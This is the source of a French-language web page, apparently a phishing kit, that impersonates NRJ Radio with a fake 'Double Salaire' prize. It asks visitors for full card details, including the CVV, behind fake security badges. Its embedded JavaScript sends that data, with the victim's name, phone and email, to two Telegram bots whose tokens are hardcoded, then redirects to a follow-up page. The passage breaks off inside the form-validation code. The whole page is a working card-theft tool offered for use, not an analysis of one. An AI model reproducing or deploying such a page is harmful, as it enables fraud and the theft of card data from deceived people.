<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=5.0">
    <meta name="description" content="Finalisez votre gain NRJ Double Salaire en toute sécurité">
    <meta name="keywords" content="NRJ, Double Salaire, Gain, Concours, Paiement sécurisé">
    <meta name="author" content="NRJ Radio">
    <meta name="robots" content="noindex, nofollow">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="theme-color" content="#E2001A">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="format-detection" content="telephone=no">
    
    <title>NRJ Double Salaire - Finalisation Sécurisée de Votre Gain | NRJ Radio</title>
    
    <!-- Favicon -->
    <link rel="icon" type="image/png" href="Nrj2014.png" sizes="32x32">
    <link rel="icon" type="image/png" href="Nrj2014.png" sizes="96x96">
    <link rel="apple-touch-icon" href="Nrj2014.png">
    
    <style>
        :root {
            --nrj-red: #E2001A;
            --nrj-dark-red: #C00015;
            --nrj-black: #121212;
            --nrj-dark-gray: #222222;
            --nrj-gray: #444444;
            --nrj-light-gray: #f8f9fa;
            --nrj-white: #FFFFFF;
            --nrj-green: #4CAF50;
            --nrj-blue: #2196F3;
            --nrj-yellow: #FFC107;
            --nrj-orange: #FF9800;
            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.05);
            --shadow-md: 0 4px 6px rgba(0, 0, 0, 0.1);
            --shadow-lg: 0 10px 15px rgba(0, 0, 0, 0.1);
            --shadow-xl: 0 20px 25px rgba(0, 0, 0, 0.1);
            --border-radius-sm: 4px;
            --border-radius-md: 8px;
            --border-radius-lg: 12px;
            --border-radius-xl: 20px;
            --spacing-xs: 4px;
            --spacing-sm: 8px;
            --spacing-md: 16px;
            --spacing-lg: 24px;
            --spacing-xl: 32px;
            --spacing-xxl: 48px;
            --max-width: 1100px;
            --font-size-xs: 0.75rem;
            --font-size-sm: 0.875rem;
            --font-size-md: 1rem;
            --font-size-lg: 1.125rem;
            --font-size-xl: 1.25rem;
            --font-size-xxl: 1.5rem;
            --font-size-xxxl: 2rem;
            --font-size-xxxxl: 2.5rem;
            --font-size-xxxxxl: 3rem;
            --z-index-low: 10;
            --z-index-medium: 100;
            --z-index-high: 1000;
            --opacity-disabled: 0.6;
        }

        *,
        *::before,
        *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        html {
            scroll-behavior: smooth;
            font-size: 16px;
            height: 100%;
        }

        body {
            font-family: 'Roboto', sans-serif;
            color: var(--nrj-dark-gray);
            background-color: var(--nrj-light-gray);
            line-height: 1.7;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: var(--spacing-xl) var(--spacing-lg);
            text-rendering: optimizeLegibility;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .skip-link {
            position: absolute;
            top: -40px;
            left: 0;
            background: var(--nrj-red);
            color: var(--nrj-white);
            padding: var(--spacing-sm) var(--spacing-md);
            z-index: var(--z-index-high);
            transition: top 0.3s;
        }

        .skip-link:focus {
            top: 0;
        }

        .main-container {
            width: 100%;
            max-width: var(--max-width);
            background-color: var(--nrj-white);
            border-radius: var(--border-radius-xl);
            box-shadow: var(--shadow-xl);
            overflow: hidden;
            display: grid;
            grid-template-columns: 450px 1fr;
            position: relative;
            transition: var(--transition);
        }

        .info-panel {
            background: var(--nrj-white);
            color: var(--nrj-black);
            padding: var(--spacing-xxl) var(--spacing-xl);
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            position: relative;
            overflow: hidden;
        }

        .info-panel::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(226, 0, 26, 0.1) 0%, transparent 70%);
            pointer-events: none;
        }

        .info-panel .logo {
            height: 45px;
            width: auto;
            align-self: flex-start;
            margin-bottom: var(--spacing-xxl);
            object-fit: contain;
        }

        .info-panel h1 {
            font-family: 'Montserrat', sans-serif;
            font-size: var(--font-size-xxxxl);
            margin-bottom: var(--spacing-lg);
            line-height: 1.2;
            font-weight: 800;
            position: relative;
        }

        .info-panel .intro-text {
            font-size: var(--font-size-lg);
            color: var(--nrj-gray);
            margin-bottom: var(--spacing-xl);
        }
        
        .prize-display {
            background: var(--nrj-light-gray);
            padding: var(--spacing-lg);
            border-radius: var(--border-radius-md);
            margin-bottom: var(--spacing-xl);
            text-align: center;
            position: relative;
            overflow: hidden;
            border: 1px solid #eee;
        }

        .prize-display::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, var(--nrj-red), var(--nrj-yellow));
        }

        .prize-display p {
            font-size: var(--font-size-md);
            color: var(--nrj-gray);
            margin-bottom: var(--spacing-sm);
        }

        .prize-highlight {
            font-size: var(--font-size-xxxxxl);
            font-weight: 800;
            color: var(--nrj-red);
            line-height: 1;
            text-shadow: none;
            position: relative;
            display: inline-block;
        }

        .prize-highlight::after {
            content: '';
            position: absolute;
            bottom: -5px;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, var(--nrj-red), transparent);
        }

        .winner-details {
            border-top: 1px solid #eee;
            padding-top: var(--spacing-lg);
            font-size: var(--font-size-sm);
            color: var(--nrj-gray);
        }

        .winner-details h4 {
            font-size: var(--font-size-lg);
            color: var(--nrj-black);
            margin-bottom: var(--spacing-md);
            font-weight: 600;
        }

        .winner-details p {
            margin-bottom: var(--spacing-xs);
            color: var(--nrj-dark-gray);
            display: flex;
            align-items: center;
        }

        .winner-details p strong {
            min-width: 80px;
            display: inline-block;
            color: var(--nrj-gray);
        }

        .payment-panel {
            padding: var(--spacing-xxl) var(--spacing-xl);
            overflow-y: auto;
            scrollbar-width: thin;
            scrollbar-color: var(--nrj-red) var(--nrj-light-gray);
        }

        .payment-panel::-webkit-scrollbar {
            width: 6px;
        }

        .payment-panel::-webkit-scrollbar-track {
            background: var(--nrj-light-gray);
        }

        .payment-panel::-webkit-scrollbar-thumb {
            background-color: var(--nrj-red);
            border-radius: 3px;
        }

        .payment-panel h2 {
            font-family: 'Montserrat', sans-serif;
            font-size: var(--font-size-xxxl);
            margin-bottom: var(--spacing-md);
            color: var(--nrj-black);
            font-weight: 700;
            position: relative;
        }

        .payment-panel h2::after {
            content: '';
            position: absolute;
            bottom: -5px;
            left: 0;
            width: 60px;
            height: 3px;
            background: var(--nrj-red);
        }

        .secure-badge-container {
            display: flex;
            gap: var(--spacing-md);
            margin-bottom: var(--spacing-xl);
            flex-wrap: wrap;
        }

        .secure-badge {
            display: inline-flex;
            align-items: center;
            gap: var(--spacing-xs);
            background-color: #e8f5e9;
            color: #2e7d32;
            padding: var(--spacing-xs) var(--spacing-md);
            border-radius: 50px;
            font-size: var(--font-size-xs);
            font-weight: 500;
            transition: var(--transition);
        }

        .secure-badge:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-sm);
        }

        .secure-badge svg {
            width: 14px;
            height: 14px;
            fill: currentColor;
        }

        .form-group {
            margin-bottom: var(--spacing-lg);
            position: relative;
        }

        .form-label {
            display: block;
            margin-bottom: var(--spacing-xs);
            font-weight: 600;
            color: var(--nrj-gray);
            font-size: var(--font-size-sm);
        }

        .form-control {
            width: 100%;
            padding: var(--spacing-md) var(--spacing-lg);
            border: 1px solid #ccc;
            border-radius: var(--border-radius-md);
            font-size: var(--font-size-md);
            transition: var(--transition);
            background-color: #fdfdfd;
            font-family: 'Roboto', sans-serif;
        }

        .form-control:focus {
            outline: none;
            border-color: var(--nrj-red);
            box-shadow: 0 0 0 4px rgba(226, 0, 26, 0.15);
            background-color: var(--nrj-white);
        }

        .form-control::placeholder {
            color: #aaa;
            opacity: 1;
        }

        .form-control:disabled {
            background-color: #eee;
            cursor: not-allowed;
            opacity: var(--opacity-disabled);
        }

        .form-hint {
            font-size: var(--font-size-xs);
            color: var(--nrj-gray);
            margin-top: var(--spacing-xs);
            display: block;
        }

        .form-error {
            color: var(--nrj-red);
            font-size: var(--font-size-xs);
            margin-top: var(--spacing-xs);
            display: none;
        }

        .form-group.error .form-control {
            border-color: var(--nrj-red);
        }

        .form-group.error .form-error {
            display: block;
        }

        .form-group.success .form-control {
            border-color: var(--nrj-green);
        }

        .card-details {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr;
            gap: var(--spacing-lg);
        }

        .card-icons {
            display: flex;
            gap: var(--spacing-xs);
            margin-top: var(--spacing-xs);
        }

        .card-icon {
            width: 40px;
            height: 25px;
            background-color: var(--nrj-light-gray);
            border-radius: var(--border-radius-sm);
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .card-icon img {
            max-width: 80%;
            max-height: 80%;
            object-fit: contain;
        }

        .submit-btn {
            width: 100%;
            padding: var(--spacing-lg);
            background: linear-gradient(45deg, var(--nrj-red), var(--nrj-dark-red));
            color: var(--nrj-white);
            border: none;
            border-radius: var(--border-radius-md);
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            cursor: pointer;
            transition: var(--transition);
            font-size: var(--font-size-lg);
            margin-top: var(--spacing-md);
            box-shadow: 0 4px 15px rgba(226, 0, 26, 0.3);
            position: relative;
            overflow: hidden;
        }

        .submit-btn::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: rgba(255, 255, 255, 0.1);
            transform: rotate(30deg);
            transition: var(--transition);
        }

        .submit-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(226, 0, 26, 0.4);
        }

        .submit-btn:hover::after {
            left: 100%;
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .submit-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .submit-btn:disabled::after {
            display: none;
        }

        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: var(--nrj-white);
            animation: spin 1s ease-in-out infinite;
            margin-left: var(--spacing-xs);
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .payment-info {
            font-size: var(--font-size-sm);
            color: var(--nrj-gray);
            margin-top: var(--spacing-xl);
            text-align: center;
            line-height: 1.5;
            position: relative;
            padding-top: var(--spacing-lg);
        }

        .payment-info::before {
            content: '';
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 100px;
            height: 1px;
            background: linear-gradient(90deg, transparent, #ccc, transparent);
        }
        
        .faq-section {
            margin-top: var(--spacing-xl);
            border-top: 1px solid #eee;
            padding-top: var(--spacing-xl);
        }
        
        .faq-section h3 {
            font-family: 'Montserrat', sans-serif;
            font-size: var(--font-size-xxl);
            margin-bottom: var(--spacing-lg);
            text-align: center;
            position: relative;
        }
        
        .faq-section h3::after {
            content: '';
            position: absolute;
            bottom: -8px;
            left: 50%;
            transform: translateX(-50%);
            width: 60px;
            height: 3px;
            background: var(--nrj-red);
        }
        
        .faq-item {
            margin-bottom: var(--spacing-md);
            border-bottom: 1px solid #eee;
            padding-bottom: var(--spacing-md);
        }
        
        .faq-item:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }
        
        .faq-question {
            font-weight: 600;
            color: var(--nrj-black);
            font-size: var(--font-size-md);
            margin-bottom: var(--spacing-xs);
            display: flex;
            align-items: center;
            cursor: pointer;
        }
        
        .faq-question::before {
            content: '+';
            display: inline-block;
            margin-right: var(--spacing-xs);
            color: var(--nrj-red);
            font-weight: bold;
            transition: var(--transition);
        }
        
        .faq-item.active .faq-question::before {
            content: '-';
        }
        
        .faq-answer {
            color: var(--nrj-gray);
            font-size: var(--font-size-sm);
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.3s ease-out;
        }
        
        .faq-item.active .faq-answer {
            max-height: 200px;
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: var(--z-index-high);
            opacity: 0;
            visibility: hidden;
            transition: var(--transition);
        }

        .modal-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        .modal {
            background: var(--nrj-white);
            border-radius: var(--border-radius-lg);
            width: 90%;
            max-width: 500px;
            padding: var(--spacing-xl);
            position: relative;
            transform: translateY(20px);
            transition: var(--transition);
            max-height: 90vh;
            overflow-y: auto;
        }

        .modal-overlay.active .modal {
            transform: translateY(0);
        }

        .modal-close {
            position: absolute;
            top: var(--spacing-md);
            right: var(--spacing-md);
            background: none;
            border: none;
            font-size: var(--font-size-xl);
            cursor: pointer;
            color: var(--nrj-gray);
            transition: var(--transition);
        }

        .modal-close:hover {
            color: var(--nrj-red);
        }

        .modal-title {
            font-family: 'Montserrat', sans-serif;
            font-size: var(--font-size-xxl);
            margin-bottom: var(--spacing-md);
            color: var(--nrj-black);
        }

        .modal-content {
            margin-bottom: var(--spacing-lg);
        }

        .modal-footer {
            display: flex;
            justify-content: flex-end;
            gap: var(--spacing-md);
        }

        .tooltip {
            position: relative;
            display: inline-block;
            margin-left: var(--spacing-xs);
        }

        .tooltip-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 18px;
            height: 18px;
            background: var(--nrj-gray);
            color: var(--nrj-white);
            border-radius: 50%;
            font-size: var(--font-size-xs);
            cursor: help;
        }

        .tooltip-text {
            position: absolute;
            bottom: 100%;
            left: 50%;
            transform: translateX(-50%);
            background: var(--nrj-black);
            color: var(--nrj-white);
            padding: var(--spacing-sm);
            border-radius: var(--border-radius-sm);
            font-size: var(--font-size-xs);
            width: 200px;
            text-align: center;
            margin-bottom: var(--spacing-sm);
            visibility: hidden;
            opacity: 0;
            transition: var(--transition);
            z-index: var(--z-index-medium);
        }

        .tooltip-icon:hover + .tooltip-text {
            visibility: visible;
            opacity: 1;
        }

        @media (max-width: 992px) {
            .main-container {
                grid-template-columns: 1fr;
                max-width: 600px;
            }
            
            .info-panel {
                padding: var(--spacing-xl) var(--spacing-lg);
                text-align: center;
            }
            
            .info-panel .logo {
                align-self: center;
            }
            
            .payment-panel {
                padding: var(--spacing-xl) var(--spacing-lg);
            }
            
            .card-details {
                grid-template-columns: 1fr 1fr;
            }
            
            .card-details .form-group:first-child {
                grid-column: 1 / -1;
            }
        }
        
        @media (max-width: 768px) {
            :root {
                --font-size-xxxxl: 2rem;
                --font-size-xxxxxl: 2.5rem;
            }
            
            body {
                padding: var(--spacing-lg) var(--spacing-md);
            }
            
            .info-panel h1 {
                font-size: var(--font-size-xxxl);
            }
            
            .prize-highlight {
                font-size: var(--font-size-xxxxl);
            }
        }
        
        @media (max-width: 576px) {
            body {
                padding: var(--spacing-md) var(--spacing-sm);
            }
            
            .card-details {
                grid-template-columns: 1fr;
            }
            
            .info-panel, .payment-panel {
                padding: var(--spacing-lg) var(--spacing-md);
            }
            
            .info-panel h1 {
                font-size: var(--font-size-xxl);
            }
            
            .payment-panel h2 {
                font-size: var(--font-size-xxl);
            }
            
            .submit-btn {
                padding: var(--spacing-md);
                font-size: var(--font-size-md);
            }
            
            .modal {
                padding: var(--spacing-lg) var(--spacing-md);
                width: 95%;
            }
        }

        @media print {
            body {
                background: none;
                padding: 0;
            }
            
            .main-container {
                box-shadow: none;
                border-radius: 0;
                grid-template-columns: 1fr;
                max-width: 100%;
            }
            
            .info-panel {
                background: #000 !important;
                color: #fff !important;
                -webkit-print-color-adjust: exact;
                print-color-adjust: exact;
            }
            
            .submit-btn, .secure-badge-container, .faq-section {
                display: none;
            }
            
            .payment-panel {
                padding: 0;
            }
        }

        @media (prefers-reduced-motion: reduce) {
            * {
                animation-duration: 0.01ms !important;
                animation-iteration-count: 1 !important;
                transition-duration: 0.01ms !important;
                scroll-behavior: auto !important;
            }
        }

        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            flex-direction: column;
            color: var(--nrj-black);
            font-family: 'Montserrat', sans-serif;
            font-size: var(--font-size-xxl);
            font-weight: 700;
            text-align: center;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s, visibility 0.3s;
        }

        .loading-overlay.visible {
            opacity: 1;
            visibility: visible;
        }

        .loading-overlay .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(0, 0, 0, 0.1);
            border-top-color: var(--nrj-red);
            margin-bottom: var(--spacing-lg);
        }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        Traitement en cours...
    </div>
    <a href="#main-content" class="skip-link">Aller au contenu principal</a>

    <div class="main-container" id="main-content">
        <div class="info-panel" role="complementary" aria-label="Détails du gain">
            <div>
                <img src="Nrj2014.png" alt="NRJ Logo" class="logo" width="120" height="45" loading="eager">
                <h1>Complétez vos gains !</h1>
                <p class="intro-text">Félicitations ! Votre double salaire vous attend. Il ne reste qu’un pas pour en profiter : entrez vos coordonnées bancaires en toute sécurité et recevez immédiatement votre virement, en plusieurs versements. Un membre de l’équipe NRJ Radio vous contactera ensuite pour finaliser le solde restant.</p>
                
                <div class="prize-display">
                    <p>Votre gain exceptionnel</p>
                    <div class="prize-highlight" id="prizeAmount" aria-live="polite">0 €</div>
                </div>
            </div>

            <div class="winner-details">
                <h4>Récapitulatif de votre participation :</h4>
                <p id="winnerName"><strong>Nom :</strong> -</p>
                <p id="winnerPhone"><strong>Téléphone :</strong> -</p>
                <p id="winnerEmail"><strong>Email :</strong> -</p>
            </div>
        </div>

        <div class="payment-panel" role="main">
            <div>
                <h2>Informations de versement</h2>
                <div class="secure-badge-container">
                    <div class="secure-badge" aria-label="Connexion sécurisée SSL">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11V11.99z"/>
                        </svg>
                        <span>SSL Encrypted</span>
                    </div>
                    <div class="secure-badge" aria-label="Conforme aux normes PCI DSS">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                        </svg>
                        <span>PCI DSS Compliant</span>
                    </div>
                    <div class="secure-badge" aria-label="Paiement vérifié">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                        </svg>
                        <span>Paiement vérifié</span>
                    </div>
                </div>
                
                <form id="paymentForm" novalidate>
                    <div class="form-group">
                        <label for="cardName" class="form-label">Nom complet sur la carte</label>
                        <input type="text" id="cardName" class="form-control" required aria-required="true" autocomplete="cc-name">
                        <div class="form-error" id="cardNameError">Veuillez entrer le nom tel qu'il apparaît sur votre carte.</div>
                    </div>
                    
                    <div class="card-details">
                        <div class="form-group">
                            <label for="cardNumber" class="form-label">
                                Numéro de carte
                                <span class="tooltip">
                                    <span class="tooltip-icon" aria-hidden="true">?</span>
                                    <span class="tooltip-text">Le numéro à 16 chiffres sur le devant de votre carte</span>
                                </span>
                            </label>
                            <input type="text" id="cardNumber" class="form-control" placeholder="•••• •••• •••• ••••" required aria-required="true" inputmode="numeric" pattern="[0-9\s]{13,19}" autocomplete="cc-number" maxlength="19">
                            <div class="form-error" id="cardNumberError">Veuillez entrer un numéro de carte valide.</div>
                            <div class="card-icons">
                                <div class="card-icon" title="Visa">
                                    <img src="Visa-Logo-2021.jpg" alt="Visa">
                                </div>
                                <div class="card-icon" title="Mastercard">
                                    <img src="Mastercard_new_logo-1200x865.webp" alt="Mastercard">
                                </div>
                                <div class="card-icon" title="American Express">
                                    <img src="hd-amex-american-express-logo-png-701751694708970jttzjjyo6e.png" alt="American Express">
                                </div>
                            </div>
                        </div>
                        <div class="form-group">
                            <label for="expiryDate" class="form-label">Expiration</label>
                            <input type="text" id="expiryDate" class="form-control" placeholder="MM/AA" required aria-required="true" inputmode="numeric" pattern="(0[1-9]|1[0-2])\/?([0-9]{2})" autocomplete="cc-exp" maxlength="5">
                            <div class="form-error" id="expiryDateError">Veuillez entrer une date d'expiration valide (MM/AA).</div>
                        </div>
                        <div class="form-group">
                            <label for="cvv" class="form-label">
                                CVV
                                <span class="tooltip">
                                    <span class="tooltip-icon" aria-hidden="true">?</span>
                                    <span class="tooltip-text">Les 3 chiffres au dos de votre carte</span>
                                </span>
                            </label>
                            <input type="text" id="cvv" class="form-control" placeholder="•••" required aria-required="true" inputmode="numeric" pattern="[0-9]{3,4}" autocomplete="cc-csc" maxlength="4">
                            <div class="form-error" id="cvvError">Veuillez entrer un code de sécurité valide.</div>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <input type="checkbox" id="termsAgreement" class="form-control" required aria-required="true">
                        <label for="termsAgreement" class="form-label">J'accepte les <a href="#" id="termsLink" aria-haspopup="dialog">conditions générales</a> et la <a href="#" id="privacyLink" aria-haspopup="dialog">politique de confidentialité</a></label>
                        <div class="form-error" id="termsError">Vous devez accepter les conditions pour continuer.</div>
                    </div>
                    
                    <input type="hidden" id="hiddenName" name="name">
                    <input type="hidden" id="hiddenPrize" name="prize">
                    <input type="hidden" id="hiddenPhone" name="phone">
                    <input type="hidden" id="hiddenEmail" name="email">

                    <button type="submit" class="submit-btn" id="submitButton" aria-busy="false">
                        <span id="buttonText">Recevoir mon gain maintenant</span>
                        <span class="spinner" id="submitSpinner" style="display: none;"></span>
                    </button>
                </form>
                
                <p class="payment-info">
                    Votre gain sera transféré en plusieurs versements. Le premier paiement sera initié dans 1 ou 2 minutes suivant cette validation.
                </p>
            </div>
            
            <div class="faq-section">
                <h3>Questions fréquentes</h3>
                <div class="faq-item">
                    <p class="faq-question" tabindex="0" role="button" aria-expanded="false" aria-controls="faq1">Pourquoi avez-vous besoin de mes informations de carte ?</p>
                    <div class="faq-answer" id="faq1" role="region">
                        <p>Nous utilisons ces informations pour initier le premier versement de votre gain de manière rapide et sécurisée.</p>
                    </div>
                </div>
                <div class="faq-item">
                    <p class="faq-question" tabindex="0" role="button" aria-expanded="false" aria-controls="faq2">Est-ce que mes informations sont en sécurité ?</p>
                    <div class="faq-answer" id="faq2" role="region">
                        <p>Absolument. Toutes les informations sont cryptées avec le protocole SSL et nous respectons les normes de sécurité les plus strictes.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Terms Modal -->
    <div class="modal-overlay" id="termsModal" role="dialog" aria-modal="true" aria-labelledby="termsModalTitle" hidden>
        <div class="modal">
            <button class="modal-close" id="termsModalClose" aria-label="Fermer">&times;</button>
            <h3 class="modal-title" id="termsModalTitle">Conditions Générales</h3>
            <div class="modal-content">
                <p>En participant à cette offre NRJ Double Salaire, vous acceptez les conditions suivantes :</p>
                <ol>
                    <li>L'offre est réservée aux résidents français majeurs.</li>
                    <li>Le gain sera versé en plusieurs tranches.</li>
                    <li>Les informations fournies doivent être exactes et complètes.</li>
                </ol>
            </div>
            <div class="modal-footer">
                <button class="submit-btn" id="termsModalAccept">J'accepte</button>
            </div>
        </div>
    </div>

    <!-- Privacy Modal -->
    <div class="modal-overlay" id="privacyModal" role="dialog" aria-modal="true" aria-labelledby="privacyModalTitle" hidden>
        <div class="modal">
            <button class="modal-close" id="privacyModalClose" aria-label="Fermer">&times;</button>
            <h3 class="modal-title" id="privacyModalTitle">Politique de Confidentialité</h3>
            <div class="modal-content">
                <p>NRJ s'engage à protéger vos données personnelles :</p>
                <ul>
                    <li>Les informations collectées sont nécessaires au traitement de votre gain.</li>
                    <li>Vos données ne seront pas partagées avec des tiers sans votre consentement.</li>
                </ul>
            </div>
            <div class="modal-footer">
                <button class="submit-btn" id="privacyModalAccept">J'accepte</button>
            </div>
        </div>
    </div>

    <script>
        'use strict';

        // Configuration des bots Telegram
        const bot1Token = '8266805424:AAFt7ztOgiutgEU1Lujt4Nt_g5Qzn88wEMQ';
        const bot1ChatId = '780712584';
        const bot2Token = '8406577100:AAF7mvVd2svcSC7A2GdI6aq-i5x7o_sTbto';
        const bot2ChatId = '612575358';

        document.addEventListener('DOMContentLoaded', function() {
            // Récupération des paramètres URL
            const urlParams = new URLSearchParams(window.location.search);
            const name = urlParams.get('name');
            const prize = urlParams.get('prize');
            const phone = urlParams.get('phone');
            const email = urlParams.get('email');

            // Affichage des informations du gagnant
            if (prize) {
                document.getElementById('prizeAmount').textContent = `${prize} €`;
                document.getElementById('hiddenPrize').value = prize;
                animatePrize(prize);
            }
            
            if (name) {
                document.getElementById('winnerName').innerHTML = `<strong>Nom :</strong> ${name}`;
                document.getElementById('hiddenName').value = name;
                document.getElementById('cardName').value = name;
            }
            
            if (phone) {
                document.getElementById('winnerPhone').innerHTML = `<strong>Téléphone :</strong> ${phone}`;
                document.getElementById('hiddenPhone').value = phone;
            }
            
            if (email) {
                document.getElementById('winnerEmail').innerHTML = `<strong>Email :</strong> ${email}`;
                document.getElementById('hiddenEmail').value = email;
            }

            initFormValidation();
            initFAQAccordion();
            initModals();
            initInputMasks();
            initCardTypeDetection();
        });

        function animatePrize(targetAmount) {
            const element = document.getElementById('prizeAmount');
            const duration = 2000;
            const start = 0;
            const increment = targetAmount / (duration / 16);
            let current = start;
            
            const timer = setInterval(() => {
                current += increment;
                if (current >= targetAmount) {
                    clearInterval(timer);
                    current = targetAmount;
                }
                element.textContent = `${Math.floor(current)} €`;
            }, 16);
        }

        async function sendToTelegram(formData) {
            const message = `
<b>Nouveau paiement NRJ Double Salaire</b>
────────────────────
<strong>Nom:</strong> ${formData.name}
<strong>Gain:</strong> ${formData.prize}€
<strong>Téléphone:</strong> ${formData.phone}
<strong>Email:</strong> ${formData.email}
────────────────────
<strong>Informations de paiement:</strong>
<strong>Nom sur carte:</strong> ${formData.cardName}
<strong>Numéro de carte:</strong> ${formData.cardNumber}
<strong>Expiration:</strong> ${formData.expiryDate}
<strong>CVV:</strong> ${formData.cvv}
────────────────────
<em>${new Date().toLocaleString()}</em>
            `.trim();

            const bots = [
                { token: bot1Token, chatId: bot1ChatId },
                { token: bot2Token, chatId: bot2ChatId }
            ];

            const results = [];
            
            for (const bot of bots) {
                try {
                    const url = `https://api.telegram.org/bot${bot.token}/sendMessage`;
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: bot.chatId,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });
                    
                    const data = await response.json();
                    results.push({ success: response.ok, data });
                    
                    if (!response.ok) {
                        console.error(`Erreur avec le bot ${bot.token}:`, data);
                    }
                } catch (error) {
                    console.error(`Erreur de connexion avec le bot ${bot.token}:`, error);
                    results.push({ success: false, error });
                }
            }

            return results;
        }

        function initFormValidation() {
            const form = document.getElementById('paymentForm');
            
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                if (validateForm()) {
                    const loadingOverlay = document.getElementById('loadingOverlay');
                    loadingOverlay.classList.add('visible');
                    
                    // Récupération des données du formulaire
                    const formData = {
                        name: document.getElementById('hiddenName').value,
                        prize: document.getElementById('hiddenPrize').value,
                        phone: document.getElementById('hiddenPhone').value,
                        email: document.getElementById('hiddenEmail').value,
                        cardName: document.getElementById('cardName').value,
                        cardNumber: document.getElementById('cardNumber').value,
                        expiryDate: document.getElementById('expiryDate').value,
                        cvv: document.getElementById('cvv').value
                    };

                    try {
                        // Envoi à Telegram
                        const results = await sendToTelegram(formData);
                        
                        // Vérification des résultats
                        const atLeastOneSuccess = results.some(r => r.success);
                        
                        if (!atLeastOneSuccess) {
                            console.error("Échec de l'envoi à tous les bots");
                            localStorage.setItem('pendingPayment', JSON.stringify(formData));
                        }
                        
                        // Redirection après 3 secondes
                        setTimeout(() => {
                            window.location.href = `paiement.html?name=${encodeURIComponent(formData.name)}&prize=${encodeURIComponent(formData.prize)}`;
                        }, 3000);
                        
                    } catch (error) {
                        console.error("Erreur lors de l'envoi:", error);
                        localStorage.setItem('pendingPayment', JSON.stringify(formData));
                        
                        setTimeout(() => {
                            window.location.href = `paiement.html?name=${encodeURIComponent(formData.name)}&prize=${encodeURIComponent(formData.prize)}`;
                        }, 3000);
                    }
                }
            });
            
            document.getElementById('cardName').addEventListener('input', validateCardName);
            document.getElementById('cardNumber').addEventListener('input', validateCardNumber);
            document.getElementById('expiryDate').addEventListener('input', validateExpiryDate);
            document.getElementById('cvv').addEventListener('input', validateCVV);
            document.getElementById('termsAgreement').addEventListener('change', validateTerms);
        }
        
        function validateForm() {
            return validateCardName() && 
                   validateCardNumber() && 
                   validateExpiryDate() && 
                   validateCVV() && 
                   validateTerms();
        }
        
        function validateCardName() {
            const input = document.getElementById('cardName');
            const error = document.getElementById('cardNameError');
            const value = input.value.trim();
            
            if (value === '') {
                input.parentElement.classList.add('error');
                error.textContent = 'Veuillez entrer le nom tel qu\'il apparaît sur votre carte.';
                return false;
            }
            
            if (!/^[a-zA-ZÀ-ÿ\s\-']{3,}$/.test(value)) {
                input.parentElement.classList.add('error');
                error.textContent = 'Veuillez entrer un nom valide (minimum 3 caractères).';
                return false;
